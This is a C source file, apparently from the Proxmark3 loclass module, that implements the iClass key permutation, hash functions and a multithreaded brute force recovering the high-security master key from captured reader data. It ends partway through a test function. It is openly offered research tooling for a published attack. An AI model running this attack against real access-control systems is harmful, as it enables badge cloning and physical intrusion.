//-----------------------------------------------------------------------------
// Borrowed initially from https://github.com/holiman/loclass
// Copyright (C) 2014 Martin Holst Swende
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// WARNING
//
// THIS CODE IS CREATED FOR EXPERIMENTATION AND EDUCATIONAL USE ONLY.
//
// USAGE OF THIS CODE IN OTHER WAYS MAY INFRINGE UPON THE INTELLECTUAL
// PROPERTY OF OTHER PARTIES, SUCH AS INSIDE SECURE AND HID GLOBAL,
// AND MAY EXPOSE YOU TO AN INFRINGEMENT ACTION FROM THOSE PARTIES.
//
// THIS CODE SHOULD NEVER BE USED TO INFRINGE PATENTS OR INTELLECTUAL PROPERTY RIGHTS.
//-----------------------------------------------------------------------------
// It is a reconstruction of the cipher engine used in iClass, and RFID techology.
//
// The implementation is based on the work performed by
// Flavio D. Garcia, Gerhard de Koning Gans, Roel Verdult and
// Milosch Meriac in the paper "Dismantling IClass".
//-----------------------------------------------------------------------------
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>
#include <time.h>
#include "cipherutils.h"
#include "cipher.h"
#include "ikeys.h"
#include "elite_crack.h"
#include "fileutils.h"
#include "mbedtls/des.h"
#include "util_posix.h"

/**
 * @brief Permutes a key from standard NIST format to Iclass specific format
 *  from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220
 *
 *  If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.
 *
 *  1 0 1 1 1 1 1 1  bf
 *  0 0 0 0 0 0 0 1  01
 *  0 0 1 0 1 1 0 1  2d
 *  0 0 1 0 1 0 1 0  2a
 *  1 1 1 1 1 0 0 1  f9
 *  0 1 0 0 0 1 0 0  44
 *  1 0 0 0 1 1 0 1  8d
 *  0 1 1 0 1 1 0 0  6c
 *
 *  8 0 b 8 b a 9 e
 *  a d 9 8 b 7 0 a
 *
 * @param key
 * @param dest
 */
void permutekey(const uint8_t key[8], uint8_t dest[8]) {
    for (uint8_t i = 0 ; i < 8 ; i++) {
        dest[i] = (((key[7] & (0x80 >> i)) >> (7 - i)) << 7) |
                  (((key[6] & (0x80 >> i)) >> (7 - i)) << 6) |
                  (((key[5] & (0x80 >> i)) >> (7 - i)) << 5) |
                  (((key[4] & (0x80 >> i)) >> (7 - i)) << 4) |
                  (((key[3] & (0x80 >> i)) >> (7 - i)) << 3) |
                  (((key[2] & (0x80 >> i)) >> (7 - i)) << 2) |
                  (((key[1] & (0x80 >> i)) >> (7 - i)) << 1) |
                  (((key[0] & (0x80 >> i)) >> (7 - i)) << 0);
    }
}
/**
 * Permutes  a key from iclass specific format to NIST format
 * @brief permutekey_rev
 * @param key
 * @param dest
 */
void permutekey_rev(const uint8_t key[8], uint8_t dest[8]) {
    int i;
    for (i = 0 ; i < 8 ; i++) {
        dest[7 - i] = (((key[0] & (0x80 >> i)) >> (7 - i)) << 7) |
                      (((key[1] & (0x80 >> i)) >> (7 - i)) << 6) |
                      (((key[2] & (0x80 >> i)) >> (7 - i)) << 5) |
                      (((key[3] & (0x80 >> i)) >> (7 - i)) << 4) |
                      (((key[4] & (0x80 >> i)) >> (7 - i)) << 3) |
                      (((key[5] & (0x80 >> i)) >> (7 - i)) << 2) |
                      (((key[6] & (0x80 >> i)) >> (7 - i)) << 1) |
                      (((key[7] & (0x80 >> i)) >> (7 - i)) << 0);
    }
}

/**
 * Helper function for hash1
 * @brief rr
 * @param val
 * @return
 */
static inline uint8_t rr(uint8_t val) {
    return val >> 1 | ((val & 1) << 7);
}

/**
 * Helper function for hash1
 * @brief rl
 * @param val
 * @return
 */
static inline uint8_t rl(uint8_t val) {
    return val << 1 | ((val & 0x80) >> 7);
}

/**
 * Helper function for hash1
 * @brief swap
 * @param val
 * @return
 */
static inline uint8_t swap(uint8_t val) {
    return ((val >> 4) & 0xFF) | ((val & 0xFF) << 4);
}

/**
 * Hash1 takes CSN as input, and determines what bytes in the keytable will be used
 * when constructing the K_sel.
 * @param csn the CSN used
 * @param k output
 */
void hash1(const uint8_t csn[], uint8_t k[]) {
    k[0] = csn[0] ^ csn[1] ^ csn[2] ^ csn[3] ^ csn[4] ^ csn[5] ^ csn[6] ^ csn[7];
    k[1] = csn[0] + csn[1] + csn[2] + csn[3] + csn[4] + csn[5] + csn[6] + csn[7];
    k[2] = rr(swap(csn[2] + k[1]));
    k[3] = rl(swap(csn[3] + k[0]));
    k[4] = ~rr(csn[4] + k[2]) + 1;
    k[5] = ~rl(csn[5] + k[3]) + 1;
    k[6] = rr(csn[6] + (k[4] ^ 0x3c));
    k[7] = rl(csn[7] + (k[5] ^ 0xc3));

    k[7] &= 0x7F;
    k[6] &= 0x7F;
    k[5] &= 0x7F;
    k[4] &= 0x7F;
    k[3] &= 0x7F;
    k[2] &= 0x7F;
    k[1] &= 0x7F;
    k[0] &= 0x7F;
}
/**
Definition 14. Define the rotate key function rk : (F 82 ) 8 × N → (F 82 ) 8 as
rk(x [0] . . . x [7] , 0) = x [0] . . . x [7]
rk(x [0] . . . x [7] , n + 1) = rk(rl(x [0] ) . . . rl(x [7] ), n)
**/
static void rk(uint8_t *key, uint8_t n, uint8_t *outp_key) {
    memcpy(outp_key, key, 8);
    while (n-- > 0) {
        outp_key[0] = rl(outp_key[0]);
        outp_key[1] = rl(outp_key[1]);
        outp_key[2] = rl(outp_key[2]);
        outp_key[3] = rl(outp_key[3]);
        outp_key[4] = rl(outp_key[4]);
        outp_key[5] = rl(outp_key[5]);
        outp_key[6] = rl(outp_key[6]);
        outp_key[7] = rl(outp_key[7]);
    }
}

static mbedtls_des_context ctx_enc;
static mbedtls_des_context ctx_dec;

static void desdecrypt_iclass(uint8_t *iclass_key, uint8_t *input, uint8_t *output) {
    uint8_t key_std_format[8] = {0};
    permutekey_rev(iclass_key, key_std_format);
    mbedtls_des_setkey_dec(&ctx_dec, key_std_format);
    mbedtls_des_crypt_ecb(&ctx_dec, input, output);
}

static void desencrypt_iclass(uint8_t *iclass_key, uint8_t *input, uint8_t *output) {
    uint8_t key_std_format[8] = {0};
    permutekey_rev(iclass_key, key_std_format);
    mbedtls_des_setkey_enc(&ctx_enc, key_std_format);
    mbedtls_des_crypt_ecb(&ctx_enc, input, output);
}

/**
 * @brief Insert uint8_t[8] custom master key to calculate hash2 and return key_select.
 * @param key unpermuted custom key
 * @param hash1 hash1
 * @param key_sel output key_sel=h[hash1[i]]
 */
void hash2(uint8_t *key64, uint8_t *outp_keytable) {
    /**
     *Expected:
     * High Security Key Table

    00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
    10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
    20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
    30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
    40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
    50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
    60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
    70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

    **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ******/
    uint8_t key64_negated[8] = {0};
    uint8_t z[8][8] = {{0}, {0}};
    uint8_t temp_output[8] = {0};
    //calculate complement of key
    key64_negated[0] = ~key64[0];
    key64_negated[1] = ~key64[1];
    key64_negated[2] = ~key64[2];
    key64_negated[3] = ~key64[3];
    key64_negated[4] = ~key64[4];
    key64_negated[5] = ~key64[5];
    key64_negated[6] = ~key64[6];
    key64_negated[7] = ~key64[7];

    // Once again, key is on iclass-format
    desencrypt_iclass(key64, key64_negated, z[0]);

    if (g_debugMode > 0) {
        PrintAndLogEx(DEBUG, "High security custom key (Kcus):");
        PrintAndLogEx(DEBUG, "z0  %s", sprint_hex(z[0], 8));
    }

    uint8_t y[8][8] = {{0}, {0}};

    // y[0]=DES_dec(z[0],~key)
    // Once again, key is on iclass-format
    desdecrypt_iclass(z[0], key64_negated, y[0]);
//    PrintAndLogEx(INFO, "y0  %s",  sprint_hex(y[0],8));

    for (uint8_t i = 1; i < 8; i++) {
        // z [i] = DES dec (rk(K cus , i), z [i−1] )
        rk(key64, i, temp_output);
        //y [i] = DES enc (rk(K cus , i), y [i−1] )

        desdecrypt_iclass(temp_output, z[i - 1], z[i]);
        desencrypt_iclass(temp_output, y[i - 1], y[i]);
    }

    if (outp_keytable != NULL) {
        for (uint8_t i = 0 ; i < 8 ; i++) {
            memcpy(outp_keytable + i * 16, y[i], 8);
            memcpy(outp_keytable + 8 + i * 16, z[i], 8);
        }
    } else {
        printarr_human_readable("hash2", outp_keytable, 128);
    }
}

/**
 * @brief Reads data from the iclass-reader-attack dump file.
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
 *    <8 byte CSN><8 byte CC><4 byte NR><4 byte MAC><8 byte HASH1><1 byte NUM_BYTES_TO_RECOVER><3 bytes BYTES_TO_RECOVER>
 *    .. N times...
 *
 *  So the first attack, with 3 bytes to recover would be : ... 03000145
 *  And a later attack, with 1 byte to recover (byte 0x5)would be : ...01050000
 *  And an attack, with 2 bytes to recover (byte 0x5 and byte 0x07 )would be : ...02050700
 *
 * @param cc_nr an array to store cc_nr into (12 bytes)
 * @param csn an arracy ot store CSN into (8 bytes)
 * @param received_mac an array to store MAC into (4 bytes)
 * @param i the number to read. Should be less than 127, or something is wrong...
 * @return
 */
/*
static int _readFromDump(uint8_t dump[], dumpdata *item, uint8_t i) {
    size_t itemsize = sizeof(dumpdata);
    memcpy(item, dump + i * itemsize, itemsize);

    if (true) {
        PrintAndLogEx(INFO, "csn    %s", sprint_hex(item->csn, sizeof(item->csn)));
        PrintAndLogEx(INFO, "cc_nr  %s", sprint_hex(item->cc_nr, sizeof(item->cc_nr)));
        PrintAndLogEx(INFO, "mac    %s", sprint_hex(item->mac, sizeof(item->mac)));
    }
    return 0;
}
*/

typedef struct {
    int thread_idx;
    uint32_t endmask;
    uint8_t numbytes_to_recover;
    uint8_t bytes_to_recover[3];
    uint8_t key_index[8];
    uint16_t keytable[128];
    loclass_dumpdata_t item;
} loclass_thread_arg_t;

typedef struct {
    uint8_t values[3];
} loclass_thread_ret_t;

static size_t loclass_tc = 1;
static int loclass_found = 0;

static void *bf_thread(void *thread_arg) {

    loclass_thread_arg_t *targ = (loclass_thread_arg_t *)thread_arg;
    const uint32_t endmask = targ->endmask;
    const uint8_t numbytes_to_recover = targ->numbytes_to_recover;
    uint32_t brute = targ->thread_idx;

    uint8_t csn[8];
    uint8_t cc_nr[12];
    uint8_t mac[4];
    uint8_t key_index[8];
    uint8_t bytes_to_recover[3];
    uint16_t keytable[128];

    memcpy(csn, targ->item.csn, sizeof(csn));
    memcpy(cc_nr, targ->item.cc_nr, sizeof(cc_nr));
    memcpy(mac, targ->item.mac, sizeof(mac));
    memcpy(key_index, targ->key_index, sizeof(key_index));
    memcpy(bytes_to_recover, targ->bytes_to_recover, sizeof(bytes_to_recover));
    memcpy(keytable, targ->keytable, sizeof(keytable));

    while (!(brute & endmask)) {

        int found = __atomic_load_n(&loclass_found, __ATOMIC_SEQ_CST);

        if (found != 0xFF) return NULL;

        //Update the keytable with the brute-values
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF00;
            keytable[bytes_to_recover[i]] |= (brute >> (i * 8) & 0xFF);
        }

        uint8_t key_sel[8] = {0};

        // Piece together the key
        key_sel[0] = keytable[key_index[0]] & 0xFF;
        key_sel[1] = keytable[key_index[1]] & 0xFF;
        key_sel[2] = keytable[key_index[2]] & 0xFF;
        key_sel[3] = keytable[key_index[3]] & 0xFF;
        key_sel[4] = keytable[key_index[4]] & 0xFF;
        key_sel[5] = keytable[key_index[5]] & 0xFF;
        key_sel[6] = keytable[key_index[6]] & 0xFF;
        key_sel[7] = keytable[key_index[7]] & 0xFF;

        // Permute from iclass format to standard format

        uint8_t key_sel_p[8] = {0};
        permutekey_rev(key_sel, key_sel_p);

        // Diversify
        uint8_t div_key[8] = {0};
        diversifyKey(csn, key_sel_p, div_key);

        // Calc mac
        uint8_t calculated_MAC[4] = {0};
        doMAC(cc_nr, div_key, calculated_MAC);

        // success
        if (memcmp(calculated_MAC, mac, 4) == 0) {

            loclass_thread_ret_t *r = (loclass_thread_ret_t *)malloc(sizeof(loclass_thread_ret_t));

            for (uint8_t i = 0 ; i < numbytes_to_recover; i++) {
                r->values[i] = keytable[bytes_to_recover[i]] & 0xFF;
            }
            __atomic_store_n(&loclass_found, targ->thread_idx, __ATOMIC_SEQ_CST);
            pthread_exit((void *)r);
        }

        brute += loclass_tc;

#define _CLR_ "\x1b[0K"

        if (numbytes_to_recover == 3) {
            if ((brute > 0) && ((brute & 0xFFFF) == 0)) {
                PrintAndLogEx(INPLACE, "[ %02x %02x %02x ] %8u / %u", bytes_to_recover[0], bytes_to_recover[1], bytes_to_recover[2], brute, 0xFFFFFF);
            }
        } else if (numbytes_to_recover == 2) {
            if ((brute > 0) && ((brute & 0x3F) == 0))
                PrintAndLogEx(INPLACE, "[ %02x %02x ] %5u / %u" _CLR_, bytes_to_recover[0], bytes_to_recover[1], brute, 0xFFFF);
        } else {
            if ((brute > 0) && ((brute & 0x1F) == 0))
                PrintAndLogEx(INPLACE, "[ %02x ] %3u / %u" _CLR_, bytes_to_recover[0], brute, 0xFF);
        }
    }
    pthread_exit(NULL);

    void *dummyptr = NULL;
    return dummyptr;
}

int bruteforceItem(loclass_dumpdata_t item, uint16_t keytable[]) {

    // reset thread signals
    loclass_found = 0xFF;

    //Get the key index (hash1)
    uint8_t key_index[8] = {0};
    hash1(item.csn, key_index);

    /*
     * Determine which bytes to retrieve. A hash is typically
     * 01010000454501
     * We go through that hash, and in the corresponding keytable, we put markers
     * on what state that particular index is:
     * - CRACKED (this has already been cracked)
     * - BEING_CRACKED (this is being bruteforced now)
     * - CRACK_FAILED (self-explaining...)
     *
     * The markers are placed in the high area of the 16 bit key-table.
     * Only the lower eight bits correspond to the (hopefully cracked) key-value.
     **/
    uint8_t bytes_to_recover[3] = {0};
    uint8_t numbytes_to_recover = 0;
    for (uint8_t i = 0; i < 8; i++) {
        if (keytable[key_index[i]] & (LOCLASS_CRACKED | LOCLASS_BEING_CRACKED)) continue;

        bytes_to_recover[numbytes_to_recover++] = key_index[i];
        keytable[key_index[i]] |= LOCLASS_BEING_CRACKED;

        if (numbytes_to_recover > 3) {
            PrintAndLogEx(FAILED, "The CSN requires > 3 byte bruteforce, not supported");
            PrintAndLogEx(INFO, "CSN   %s", sprint_hex(item.csn, 8));
            PrintAndLogEx(INFO, "HASH1 %s", sprint_hex(key_index, 8));
            PrintAndLogEx(NORMAL, "");
            //Before we exit, reset the 'BEING_CRACKED' to zero
            keytable[bytes_to_recover[0]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[1]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[2]]  &= ~LOCLASS_BEING_CRACKED;
            return PM3_ESOFT;
        }
    }

    if (numbytes_to_recover == 0) {
        PrintAndLogEx(INFO, "No bytes to recover, exiting");
        return PM3_ESOFT;
    }

    loclass_thread_arg_t args[loclass_tc];
    // init thread arguments
    for (size_t i = 0; i < loclass_tc; i++) {
        args[i].thread_idx = i;
        args[i].numbytes_to_recover = numbytes_to_recover;
        args[i].endmask = 1 << 8 * numbytes_to_recover;

        memcpy((void *)&args[i].item, (void *)&item, sizeof(loclass_dumpdata_t));
        memcpy(args[i].bytes_to_recover, bytes_to_recover, sizeof(args[i].bytes_to_recover));
        memcpy(args[i].key_index, key_index, sizeof(args[i].key_index));
        memcpy(args[i].keytable, keytable, sizeof(args[i].keytable));
    }

    pthread_t threads[loclass_tc];
    // create threads
    for (size_t i = 0; i < loclass_tc; i++) {
        int res = pthread_create(&threads[i], NULL, bf_thread, (void *)&args[i]);
        if (res) {
            PrintAndLogEx(NORMAL, "");
            PrintAndLogEx(WARNING, "Failed to create pthreads. Quitting");
            return PM3_ESOFT;
        }
    }
    // wait for threads to terminate:
    void *ptrs[loclass_tc];
    for (size_t i = 0; i < loclass_tc; i++)
        pthread_join(threads[i], &ptrs[i]);

    // was it a success?
    int res = PM3_SUCCESS;
    if (loclass_found == 0xFF) {
        res = PM3_ESOFT;
        PrintAndLogEx(NORMAL, "");
        PrintAndLogEx(WARNING, "Failed to recover %d bytes using the following CSN", numbytes_to_recover);
        PrintAndLogEx(INFO, "CSN  %s", sprint_hex(item.csn, 8));

        //Before we exit, reset the 'BEING_CRACKED' to zero
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF;
            keytable[bytes_to_recover[i]] |= LOCLASS_CRACK_FAILED;
        }

    } else {
        loclass_thread_ret_t ice = *((loclass_thread_ret_t *)ptrs[loclass_found]);

        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] = ice.values[i];
            keytable[bytes_to_recover[i]] &= 0xFF;
            keytable[bytes_to_recover[i]] |= LOCLASS_CRACKED;
        }
        for (size_t i = 0; i < loclass_tc; i++) {
            free(ptrs[i]);
        }
    }

    memset(args, 0x00, sizeof(args));
    memset(threads, 0x00, sizeof(threads));
    return res;
}

/**
 * @brief Performs brute force attack against a dump-data item, containing csn, cc_nr and mac.
 *This method calculates the hash1 for the CSN, and determines what bytes need to be bruteforced
 *on the fly. If it finds that more than three bytes need to be bruteforced, it aborts.
 *It updates the keytable with the findings, also using the upper half of the 16-bit ints
 *to signal if the particular byte has been cracked or not.
 *
 * @param dump The dumpdata from iclass reader attack.
 * @param keytable where to write found values.
 * @return
 */
/*
int bruteforceItem(loclass_dumpdata_t item, uint16_t keytable[]) {

    //Get the key index (hash1)
    uint8_t key_index[8] = {0};
    hash1(item.csn, key_index);
*/
/*
 * Determine which bytes to retrieve. A hash is typically
 * 01010000454501
 * We go through that hash, and in the corresponding keytable, we put markers
 * on what state that particular index is:
 * - CRACKED (this has already been cracked)
 * - BEING_CRACKED (this is being bruteforced now)
 * - CRACK_FAILED (self-explaining...)
 *
 * The markers are placed in the high area of the 16 bit key-table.
 * Only the lower eight bits correspond to the (hopefully cracked) key-value.
 **/


/*
    uint8_t bytes_to_recover[3] = {0};
    uint8_t numbytes_to_recover = 0 ;
    for (uint8_t i = 0; i < 8; i++) {
        if (keytable[key_index[i]] & (LOCLASS_CRACKED | LOCLASS_BEING_CRACKED)) continue;

        bytes_to_recover[numbytes_to_recover++] = key_index[i];
        keytable[key_index[i]] |= LOCLASS_BEING_CRACKED;

        if (numbytes_to_recover > 3) {
            PrintAndLogEx(FAILED, "The CSN requires > 3 byte bruteforce, not supported");
            PrintAndLogEx(INFO, "CSN   %s", sprint_hex(item.csn, 8));
            PrintAndLogEx(INFO, "HASH1 %s", sprint_hex(key_index, 8));
            PrintAndLogEx(NORMAL, "");
            //Before we exit, reset the 'BEING_CRACKED' to zero
            keytable[bytes_to_recover[0]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[1]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[2]]  &= ~LOCLASS_BEING_CRACKED;
            return PM3_ESOFT;
        }
    }

    uint8_t key_sel_p[8] = {0};
    uint8_t div_key[8] = {0};
    uint8_t key_sel[8] = {0};
    uint8_t calculated_MAC[4] = {0};


    //A uint32 has room for 4 bytes, we'll only need 24 of those bits to bruteforce up to three bytes,
    uint32_t brute = 0;
*/
/*
   Determine where to stop the bruteforce. A 1-byte attack stops after 256 tries,
   (when brute reaches 0x100). And so on...
   bytes_to_recover = 1 --> endmask = 0x000000100
   bytes_to_recover = 2 --> endmask = 0x000010000
   bytes_to_recover = 3 --> endmask = 0x001000000
*/
/*
    uint32_t endmask =  1 << 8 * numbytes_to_recover;
    PrintAndLogEx(NORMAL, "----------------------------");
    for (uint8_t i = 0 ; i < numbytes_to_recover && numbytes_to_recover > 1; i++)
        PrintAndLogEx(INFO, "Bruteforcing %d", bytes_to_recover[i]);

    bool found = false;
    while (!found && !(brute & endmask)) {

        //Update the keytable with the brute-values
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF00;
            keytable[bytes_to_recover[i]] |= (brute >> (i * 8) & 0xFF);
        }

        // Piece together the key
        key_sel[0] = keytable[key_index[0]] & 0xFF;
        key_sel[1] = keytable[key_index[1]] & 0xFF;
        key_sel[2] = keytable[key_index[2]] & 0xFF;
        key_sel[3] = keytable[key_index[3]] & 0xFF;
        key_sel[4] = keytable[key_index[4]] & 0xFF;
        key_sel[5] = keytable[key_index[5]] & 0xFF;
        key_sel[6] = keytable[key_index[6]] & 0xFF;
        key_sel[7] = keytable[key_index[7]] & 0xFF;

        //Permute from iclass format to standard format
        permutekey_rev(key_sel, key_sel_p);

        diversifyKey(item.csn, key_sel_p, div_key);
        doMAC(item.cc_nr, div_key, calculated_MAC);

        // success
        if (memcmp(calculated_MAC, item.mac, 4) == 0) {
            PrintAndLogEx(NORMAL, "");
            for (uint8_t i = 0 ; i < numbytes_to_recover; i++) {
                PrintAndLogEx(SUCCESS, "%d: 0x%02x", bytes_to_recover[i], keytable[bytes_to_recover[i]] & 0xFF);
            }
            found = true;
            break;
        }

        brute++;
        if ((brute & 0xFFFF) == 0) {
            PrintAndLogEx(INPLACE, "%3d", (brute >> 16) & 0xFF);
        }
    }

    int errors = PM3_SUCCESS;

    if (found == false) {
        PrintAndLogEx(NORMAL, "");
        PrintAndLogEx(WARNING, "Failed to recover %d bytes using the following CSN", numbytes_to_recover);
        PrintAndLogEx(INFO, "CSN  %s", sprint_hex(item.csn, 8));
        errors = PM3_ESOFT;

        //Before we exit, reset the 'BEING_CRACKED' to zero
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]]  &= 0xFF;
            keytable[bytes_to_recover[i]]  |= LOCLASS_CRACK_FAILED;
        }
    } else {
        //PrintAndLogEx(SUCCESS, "DES calcs: %u", brute);
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]]  &= 0xFF;
            keytable[bytes_to_recover[i]]  |= LOCLASS_CRACKED;
        }
    }
    return errors;
}
*/

/**
 * From dismantling iclass-paper:
 *  Assume that an adversary somehow learns the first 16 bytes of hash2(K_cus ), i.e., y [0] and z [0] .
 *  Then he can simply recover the master custom key K_cus by computing
 *  K_cus = ~DES(z[0] , y[0] ) .
 *
 *  Furthermore, the adversary is able to verify that he has the correct K cus by
 *  checking whether z [0] = DES enc (K_cus , ~K_cus ).
 * @param keytable an array (128 bytes) of hash2(kcus)
 * @param master_key where to put the master key
 * @return 0 for ok, 1 for failz
 */
int calculateMasterKey(uint8_t first16bytes[], uint8_t kcus[]) {
    mbedtls_des_context ctx_e;

    uint8_t z_0[8] = {0};
    uint8_t y_0[8] = {0};
    uint8_t z_0_rev[8] = {0};
    uint8_t key64[8] = {0};
    uint8_t key64_negated[8] = {0};
    uint8_t result[8] = {0};

    // y_0 and z_0 are the first 16 bytes of the keytable
    memcpy(y_0, first16bytes, 8);
    memcpy(z_0, first16bytes + 8, 8);

    // Our DES-implementation uses the standard NIST
    // format for keys, thus must translate from iclass
    // format to NIST-format
    permutekey_rev(z_0, z_0_rev);

    // ~K_cus = DESenc(z[0], y[0])
    mbedtls_des_setkey_enc(&ctx_e, z_0_rev);
    mbedtls_des_crypt_ecb(&ctx_e, y_0, key64_negated);

    key64[0] = ~key64_negated[0];
    key64[1] = ~key64_negated[1];
    key64[2] = ~key64_negated[2];
    key64[3] = ~key64_negated[3];
    key64[4] = ~key64_negated[4];
    key64[5] = ~key64_negated[5];
    key64[6] = ~key64_negated[6];
    key64[7] = ~key64_negated[7];

    // Can we verify that the  key is correct?
    // Once again, key is on iclass-format
    uint8_t key64_stdformat[8] = {0};
    permutekey_rev(key64, key64_stdformat);

    mbedtls_des_setkey_enc(&ctx_e, key64_stdformat);
    mbedtls_des_crypt_ecb(&ctx_e, key64_negated, result);

    if (kcus != NULL)
        memcpy(kcus, key64, 8);

    if (memcmp(z_0, result, 4) != 0) {
        PrintAndLogEx(WARNING, _RED_("Failed to verify") " calculated master key (k_cus)! Something is wrong.");
        return PM3_ESOFT;
    }

    PrintAndLogEx(SUCCESS, "-----  " _CYAN_("High security custom key (Kcus)") " -----");
    PrintAndLogEx(SUCCESS, "Standard format  %s", sprint_hex(key64_stdformat, 8));
    PrintAndLogEx(SUCCESS, "iCLASS format    " _GREEN_("%s"), sprint_hex(key64, 8));
    PrintAndLogEx(SUCCESS, "Key verified ( " _GREEN_("ok") " )");
    PrintAndLogEx(NORMAL, "");
    return PM3_SUCCESS;
}
/**
 * @brief Same as bruteforcefile, but uses a an array of dumpdata instead
 * @param dump
 * @param dumpsize
 * @param keytable
 * @return
 */
int bruteforceDump(uint8_t dump[], size_t dumpsize, uint16_t keytable[]) {
    uint8_t i;
    size_t itemsize = sizeof(loclass_dumpdata_t);
    loclass_dumpdata_t *attack = (loclass_dumpdata_t *) calloc(itemsize, sizeof(uint8_t));
    if (attack == NULL) {
        PrintAndLogEx(WARNING, "failed to allocate memory");
        return PM3_EMALLOC;
    }

    loclass_tc = num_CPUs();
    PrintAndLogEx(INFO, "bruteforce using " _YELLOW_("%zu") " threads", loclass_tc);

    int res = 0;

    uint64_t t1 = msclock();
    for (i = 0 ; i * itemsize < dumpsize ; i++) {
        memcpy(attack, dump + i * itemsize, itemsize);
        res = bruteforceItem(*attack, keytable);
        if (res != PM3_SUCCESS)
            break;
    }
    free(attack);
    t1 = msclock() - t1;
    PrintAndLogEx(NORMAL, "");
    PrintAndLogEx(SUCCESS, "time " _YELLOW_("%" PRIu64) " seconds", t1 / 1000);

    if (res != PM3_SUCCESS) {
        PrintAndLogEx(ERR, "loclass exiting. Try run " _YELLOW_("`hf iclass sim -t 2`") " again and collect new data");
        return PM3_ESOFT;
    }

    // Pick out the first 16 bytes of the keytable.
    // The keytable is now in 16-bit ints, where the upper 8 bits
    // indicate crack-status. Those must be discarded for the
    // master key calculation
    uint8_t first16bytes[16] = {0};
    for (i = 0 ; i < 16 ; i++) {
        first16bytes[i] = keytable[i] & 0xFF;

        if ((keytable[i] & LOCLASS_CRACKED) != LOCLASS_CRACKED) {
            PrintAndLogEx(WARNING, "Warning: we are missing byte " _RED_("%d") " , custom key calculation will fail...", i);
            return PM3_ESOFT;
        }
    }
    return calculateMasterKey(first16bytes, NULL);
}
/**
 * Perform a bruteforce against a file which has been saved by pm3
 *
 * @brief bruteforceFile
 * @param filename
 * @return
 */
int bruteforceFile(const char *filename, uint16_t keytable[]) {

    size_t dumplen = 0;
    uint8_t *dump = NULL;
    if (loadFile_safe(filename, "", (void **)&dump, &dumplen) != PM3_SUCCESS) {
        return PM3_EFILE;
    }

    uint8_t res = bruteforceDump(dump, dumplen, keytable);
    free(dump);
    return res;
}
/**
 *
 * @brief Same as above, if you don't care about the returned keytable (results only printed on screen)
 * @param filename
 * @return
 */
int bruteforceFileNoKeys(const char *filename) {
    uint16_t keytable[128] = {0};
    return bruteforceFile(filename, keytable);
}

// ---------------------------------------------------------------------------------
// ALL CODE BELOW THIS LINE IS PURELY TESTING
// ---------------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// TEST CODE BELOW
// ----------------------------------------------------------------------------
static int _testBruteforce(void) {

    PrintAndLogEx(INFO, "Testing crack from dumpfile...");

    /**
      Expected values for the dumpfile:
        High Security Key Table

        00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
        10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
        20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
        30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
        40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
        50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
        60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
        70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

        **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ****
    **/
    uint16_t keytable[128] = {0};
    int res = bruteforceFile("iclass_dump.bin", keytable);
    if (res != PM3_SUCCESS) {
        PrintAndLogEx(ERR, "Error: The file " _YELLOW_("iclass_dump.bin") "was not found!");
    }
    return res;
}

static int _test_iclass_key_permutation(void) {
    uint8_t testcase[8] = {0x6c, 0x8d, 0x44, 0xf9, 0x2a, 0x2d, 0x01, 0xbf};
    uint8_t testcase_output[8] = {0};
    uint8_t testcase_output_correct[8] = {0x8a, 0x0d, 0xb9, 0x88, 0xbb, 0xa7, 0x90, 0xea};
    uint8_t testcase_output_rev[8] = {0};
    permutekey(testcase, testcase_output);
    permutekey_rev(testcase_output, testcase_output_rev);

    if (memcmp(testcase_output, testcase_output_correct, 8) != 0) {
        PrintAndLogEx(ERR, "Error with iclass key permute!");
        printarr("testcase_output", testcase_output, 8);
        printarr("testcase_output_correct", testcase_output_correct, 8);
        return PM3_ESOFT;

    }
